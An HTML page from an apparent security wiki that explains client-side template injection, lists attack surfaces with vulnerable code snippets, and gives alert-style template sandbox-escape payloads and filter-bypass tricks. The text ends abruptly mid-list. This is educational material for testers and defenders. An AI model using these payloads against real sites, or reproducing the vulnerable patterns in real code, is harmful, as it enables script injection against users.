@@ -1,0 +1,1880 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Client Side Template Injection (CSTI) # Definition # CSTI occurs when user input is embedded into a client-side template (Angular, Vue, Moustache, Handlebars) without proper sanitization, allowing an attacker to execute expressions within the framework&rsquo;s context.
+Difference Between SSTI and CSTI # Feature SSTI CSTI Execution Server Client (browser) Severity High (RCE possible) Medium (XSS-like) Detection Harder Easier Languages Python, PHP, Java JavaScript Impact scope Full backend compromise User/session level Attack Surfaces # Reflected Input">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="Client Side Template Injection (CSTI)" />
+<meta property="og:description" content="Client Side Template Injection (CSTI) # Definition # CSTI occurs when user input is embedded into a client-side template (Angular, Vue, Moustache, Handlebars) without proper sanitization, allowing an attacker to execute expressions within the framework&rsquo;s context.
+Difference Between SSTI and CSTI # Feature SSTI CSTI Execution Server Client (browser) Severity High (RCE possible) Medium (XSS-like) Detection Harder Easier Languages Python, PHP, Java JavaScript Impact scope Full backend compromise User/session level Attack Surfaces # Reflected Input" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Client-Side-Template-Injection-CSTI/" /><meta property="article:section" content="docs" />
+
+<meta property="article:modified_time" content="2026-08-13T23:21:07+05:30" />
+<title>Client Side Template Injection (CSTI) | Cyber Security Wiki</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
+    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Application Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
+    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Thick Client</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/checklist/" class="">Checklist</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/learningprocess_linux/" class="">Learning Process - Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/learningprocess_windows/" class="">Learning Process - Windows</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/tools_linux/" class="">Tools - Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/tools_windows/" class="">Tools - Windows</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
+    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Vulnerable Applications</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/Vulnerable-Applications/Api/" class="">API</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/Vulnerable-Applications/WebApp/" class="">Web App</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
+    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Web</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Account-Takeover/" class="">Account Takeover</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Broken-Access-Control/" class="">Broken Access Control</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Broken-Function-Level-Authorization-BFLA/" class="">Broken Function Level Authorization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Buffer-Overflow/" class="">Buffer Overflow</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Business-logic-Vulnerabilities/" class="">Business Logic</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/charset-xss/" class="">Charset XSS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Clickjacking/" class="">Clickjacking</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Client-Side-Template-Injection-CSTI/" class=" active">Client Side Template Injection (CSTI)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CORS/" class="">CORS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Credential-Stuffing/" class="">Credential Stuffing</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CRLF-Injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Cross-Site-Request-Forgery-CSRF/" class="">Cross-Site Request Forgery (CSRF)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Cross-Site-Scripting-XSS/" class="">Cross-Site Scripting (XSS)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CSV-Injection/" class="">CSV Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Denial-of-Service-DOS/" class="">Denial of Service (DOS)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/DOM-Clobbering/" class="">DOM Clobbering</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/GraphQL/" class="">GraphQL</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/HTTP-Host-Header-Injection/" class="">HTTP Host Header Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/HTTP-Request-Smuggling/" class="">HTTP Request Smuggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Identification-and-Authentication-Failures/" class="">Identification and Authentication Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Information-Disclosure/" class="">Information Disclosure</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Information-Gathering/" class="">Information Gathering</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insecure-Deserialization/" class="">Insecure Deserialization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insecure-Direct-Object-Reference-IDOR/" class="">Insecure Direct Object Reference (IDOR)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insufficient-Transport-Layer-Protection/" class="">Insufficient Transport Layer Protection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/JWT/" class="">JWT</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/LDAP-Injection/" class="">LDAP Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Mass-Assignment/" class="">Mass Assignment</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/MFA-Bypass/" class="">Multi-Factor Authentication (MFA) Bypass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/NoSQL-Injection/" class="">NoSQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/OAuth-Cheatsheet/" class="">OAuth (Open Authorization)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Open-Redirect/" class="">Open Redirect</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Padding-Oracle-Attacks/" class="">Padding Oracle Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Privilege-Escalation-Horizontal-Vertical/" class="">Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Prototype-Pollution/" class="">Prototype Pollution</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Race-Conditions/" class="">Race Conditions</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Rate-Limiting/" class="">Rate Limiting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Registration-Signup-Logic-Flaws/" class="">Registration / Signup Logic Flaws</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Security-Logging-and-Monitoring-Failures/" class="">Security Logging and Monitoring Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Security-Misconfiguration/" class="">Security Misconfiguration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Sensitive-Data-Exposure/" class="">Sensitive Data Exposure</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Server-Side-Request-Forgery-SSRF/" class="">Server-Side Request Forgery (SSRF)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Server-Side-Template-Injection-SSTI/" class="">Server-Side Template Injection (SSTI)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Session-Management-Weaknesses/" class="">Session Management Weaknesses</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Software-Data-Integrity-Failures/" class="">Software &amp; Data Integrity Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Subdomain-Takeover/" class="">Subdomain Takeover</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Third-party-service-integration-issues/" class="">Third party service integration issues</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Token-Predictability-Issues-Cheatsheet/" class="">Token Predictability / Poor Randomness</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Unrestricted-Resource-Consumption/" class="">Unrestricted Resource Consumption</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Vulnerable-Outdated-Components/" class="">Vulnerable &amp; Outdated Components</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Weak-Cryptography-Implementation/" class="">Weak Cryptography Implementation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Weak-SSL-TLS-Configurations/" class="">Weak SSL/TLS Configurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Web-Cache-Deception/" class="">Web Cache Deception</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Web-Cache-Poisoning/" class="">Web Cache Poisoning</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/XPath-Injection/" class="">XPath Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/XXE-XML-External-Entities/" class="">XXE (XML External Entities)</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
+    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Cloud Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
+    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">DevSecOps</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
+    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Exploit Development</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
+    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">IoT Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
+    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Machine Learning</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/machine-learning/learning/" class="">Learning Process</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
+    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Network</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
+    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Red Teaming</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
+    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Threat Modelling</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+<hr>
+<b>
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/contribute/" >
+        Contribute
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://securecode.wiki" target="_blank" rel="noopener">
+        Secure Code Wiki by Payatu
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</b>
+</nav>
+
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Client Side Template Injection (CSTI)</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#client-side-template-injection-csti">Client Side Template Injection (CSTI)</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#definition">Definition</a></li>
+            <li><a href="#difference-between-ssti-and-csti">Difference Between SSTI and CSTI</a></li>
+            <li><a href="#attack-surfaces"><strong>Attack Surfaces</strong></a></li>
+            <li><a href="#exploitation"><strong>Exploitation</strong></a></li>
+            <li><a href="#advanced-attack-scenarios"><strong>Advanced Attack Scenarios</strong></a></li>
+            <li><a href="#framework-specific-scenarios"><strong>Framework Specific Scenarios</strong></a></li>
+            <li><a href="#detection-techniques"><strong>Detection Techniques</strong></a></li>
+            <li><a href="#automated-techniques"><strong>Automated Techniques</strong></a></li>
+            <li><a href="#impact"><strong>Impact</strong></a></li>
+            <li><a href="#prevention-techniques"><strong>Prevention Techniques</strong></a></li>
+            <li><a href="#tools"><strong>Tools</strong></a></li>
+            <li><a href="#good-to-read"><strong>Good to Read</strong></a></li>
+            <li><a href="#references"><strong>References</strong></a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="client-side-template-injection-csti">
+  Client Side Template Injection (CSTI)
+  <a class="anchor" href="#client-side-template-injection-csti">#</a>
+</h1>
+<h3 id="definition">
+  Definition
+  <a class="anchor" href="#definition">#</a>
+</h3>
+<p>CSTI occurs when user input is embedded into a client-side template (Angular, Vue, Moustache, Handlebars) without proper sanitization, allowing an attacker to execute expressions within the framework&rsquo;s context.</p>
+<h3 id="difference-between-ssti-and-csti">
+  Difference Between SSTI and CSTI
+  <a class="anchor" href="#difference-between-ssti-and-csti">#</a>
+</h3>
+<table>
+<thead>
+<tr>
+<th>Feature</th>
+<th>SSTI</th>
+<th>CSTI</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Execution</td>
+<td>Server</td>
+<td>Client (browser)</td>
+</tr>
+<tr>
+<td>Severity</td>
+<td>High (RCE possible)</td>
+<td>Medium (XSS-like)</td>
+</tr>
+<tr>
+<td>Detection</td>
+<td>Harder</td>
+<td>Easier</td>
+</tr>
+<tr>
+<td>Languages</td>
+<td>Python, PHP, Java</td>
+<td>JavaScript</td>
+</tr>
+<tr>
+<td>Impact scope</td>
+<td>Full backend compromise</td>
+<td>User/session level</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h3 id="attack-surfaces">
+  <strong>Attack Surfaces</strong>
+  <a class="anchor" href="#attack-surfaces">#</a>
+</h3>
+<ul>
+<li>
+<p><strong>Reflected Input</strong></p>
+<ul>
+<li>Search bars</li>
+<li>Error messages</li>
+<li>Welcome [user] headers.</li>
+</ul>
+</li>
+<li>
+<p><strong>URL Fragments</strong></p>
+<ul>
+<li>Data pulled from **<code>window.location.has**h</code>.</li>
+</ul>
+</li>
+<li>
+<p><strong>XHR/API Responses</strong></p>
+<ul>
+<li>JSON data fetched from an API that is rendered via a template.</li>
+</ul>
+</li>
+<li>
+<p><strong>Single Page Applications (SPAs)</strong></p>
+<ul>
+<li>Routes and state parameters managed by the frontend framework.</li>
+</ul>
+</li>
+<li>
+<p><strong>Client-Side Storage</strong></p>
+<ul>
+<li>
+<p><strong>localStorage / sessionStorage</strong></p>
+<ul>
+<li>Apps often load user data from storage and inject into templates</li>
+</ul>
+</li>
+<li>
+<p>Example:</p>
+<pre tabindex="0"><code>constname=localStorage.getItem(&#34;username&#34;);
+element.innerHTML=`Hello {{${name} }}`;
+</code></pre></li>
+</ul>
+</li>
+<li>
+<p><strong>Cookies</strong></p>
+<ul>
+<li>Cookies read via <code>document.cookie</code> and rendered dynamically</li>
+<li>Especially risky in legacy AngularJS apps</li>
+</ul>
+</li>
+<li>
+<p><strong>WebSocket Messages</strong></p>
+<ul>
+<li>Real-time apps (chat, dashboards) render incoming messages into templates</li>
+<li>Often overlooked in testing</li>
+</ul>
+</li>
+<li>
+<p><strong>PostMessage API</strong></p>
+<ul>
+<li>
+<p>Data received from iframes or other windows:</p>
+<pre tabindex="0"><code>window.addEventListener(&#34;message&#34;, (e) =&gt; {
+renderTemplate(e.data);
+});
+</code></pre></li>
+</ul>
+</li>
+<li>
+<p><strong>Query Parameters (Deep Objects)</strong></p>
+<ul>
+<li>
+<p>Not just simple <code>?q=abc</code></p>
+</li>
+<li>
+<p>Also:</p>
+<pre tabindex="0"><code>?user[name]=test&amp;user[role]=admin
+</code></pre></li>
+</ul>
+</li>
+<li>
+<p><strong>Third-Party Integrations</strong></p>
+<ul>
+<li>Widgets, analytics, chat plugins</li>
+<li>Sometimes pass user-controlled data into templates internally</li>
+</ul>
+</li>
+<li>
+<p><strong>DOM-Based Data Binding</strong></p>
+<ul>
+<li>Framework bindings like:
+<ul>
+<li>Angular: <code>ng-bind</code>, <code>ng-bind-html</code></li>
+<li>Vue: <code>v-html</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>HTML Attributes</strong></p>
+<ul>
+<li>
+<p>Injection into attributes interpreted by frameworks:</p>
+<pre tabindex="0"><code>&lt;divng-init=&#34;user=&#39;INPUT&#39;&#34;&gt;&lt;/div&gt;
+</code></pre></li>
+</ul>
+</li>
+<li>
+<p><strong>Template Expressions in JS</strong></p>
+<ul>
+<li>
+<p>Dangerous dynamic template compilation:</p>
+<pre tabindex="0"><code>newFunction(&#34;return `&#34;+user_input+&#34;`&#34;)();
+</code></pre></li>
+</ul>
+</li>
+<li>
+<p><strong>Markdown / WYSIWYG Editors</strong></p>
+<ul>
+<li>User content rendered via template engines after parsing</li>
+<li>Seen in:
+<ul>
+<li>Comments</li>
+<li>Blogs</li>
+<li>Notes apps</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Client-Side Rendering of Logs / Debug Data</strong></p>
+<ul>
+<li>
+<p>Debug panels or logs rendered in UI</p>
+</li>
+<li>
+<p>Example:</p>
+<pre tabindex="0"><code>logPanel.innerHTML=`{{ log_message }}`;
+</code></pre></li>
+</ul>
+</li>
+<li>
+<p><strong>Prototype Pollution → CSTI Chain</strong></p>
+<ul>
+<li>
+<p>Pollute object → injected into template</p>
+</li>
+<li>
+<p>Example:</p>
+<pre tabindex="0"><code>Object.prototype.payload=&#34;{{7*7}}&#34;;
+</code></pre></li>
+</ul>
+</li>
+<li>
+<p><strong>Dynamic Routing Parameters (SPA Routers)</strong></p>
+<ul>
+<li>Framework routers:
+<ul>
+<li><code>/user/:name</code></li>
+</ul>
+</li>
+<li>Injected into views without sanitization</li>
+</ul>
+</li>
+<li>
+<p><strong>Hidden Fields / Meta Tags</strong></p>
+<ul>
+<li>
+<p>Data stored in:</p>
+<pre tabindex="0"><code>&lt;metaname=&#34;user&#34;content=&#34;{{INPUT}}&#34;&gt;
+</code></pre></li>
+<li>
+<p>Later parsed and rendered</p>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="exploitation">
+  <strong>Exploitation</strong>
+  <a class="anchor" href="#exploitation">#</a>
+</h3>
+<p>The goal is to break out of the template expression and execute arbitrary JavaScript.</p>
+<ul>
+<li><strong>Basic Polyglot</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{{ <span style="color:#a6e22e">constructor</span>.<span style="color:#a6e22e">constructor</span>(<span style="color:#e6db74">&#39;alert(1)&#39;</span>)() }}
+</span></span></code></pre></div><ul>
+<li>
+<p><strong>Encoding Bypasses</strong></p>
+<ul>
+<li><strong><code>String.fromCharCode</code>:</strong> Using the payload if quotes are filtered</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{{<span style="color:#a6e22e">$on</span>.<span style="color:#a6e22e">constructor</span>(<span style="color:#e6db74">&#39;alert(String.fromCharCode(88,83,83))&#39;</span>)()}} 
+</span></span></code></pre></div><ul>
+<li><strong>Hex/Unicode:</strong> <code>\u007b\u007b</code> instead of <code>{{</code>.</li>
+</ul>
+</li>
+<li>
+<p><strong>Double Braces</strong></p>
+<ul>
+<li>If <code>{{</code> is stripped, try <code>{{{</code> or <code>[[ ]]</code> (common in Vue/Handlebars).</li>
+</ul>
+</li>
+<li>
+<p><strong>White Space</strong></p>
+<ul>
